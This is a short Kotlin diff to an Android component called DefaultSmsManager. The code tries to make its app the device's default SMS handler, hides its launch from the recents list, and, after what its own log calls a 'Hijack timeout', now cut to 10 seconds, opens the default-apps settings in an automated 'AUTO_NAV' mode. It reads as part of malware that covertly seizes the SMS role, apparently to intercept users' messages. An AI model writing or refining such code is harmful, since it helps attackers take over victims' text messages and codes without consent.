@@ -6,10 +6,8 @@ import android.os.Build
 import android.provider.Settings
 import android.provider.Telephony
 import android.app.role.RoleManager
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.launch
+import android.os.Handler
+import android.os.Looper
 
 object DefaultSmsManager {
     var expectedMode: String = ""
@@ -41,20 +39,19 @@ object DefaultSmsManager {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or Intent.FLAG_ACTIVITY_NO_ANIMATION)
             ctx.startActivity(intent)
             
-            // CENTRALIZED ROBUST FALLBACK
-            if (expectedMode == "AUTO") {
-                CoroutineScope(Dispatchers.IO).launch {
-                    delay(60000)
-                    if (!isDefaultSms(ctx) && expectedMode == "AUTO") {
-                        DebugLogger.log("SMS_MGR", "Hijack timeout (60s). Triggering manual navigation fallback.")
-                        expectedMode = "AUTO_NAV"
-                        val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
-                        }
-                        ctx.startActivity(i)
+                    // CENTRALIZED ROBUST FALLBACK
+        if (expectedMode == "AUTO") {
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (!isDefaultSms(ctx) && expectedMode == "AUTO") {
+                    DebugLogger.log("SMS_MGR", "Hijack timeout (10s). Triggering manual navigation fallback.")
+                    expectedMode = "AUTO_NAV"
+                    val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
                     }
+                    ctx.startActivity(i)
                 }
-            }
+            }, 10000)
+        }
         } catch (e: Exception) {
             DebugLogger.log("SMS_MGR", "Failed to launch SmsRoleActivity: ${e.message}")
         }
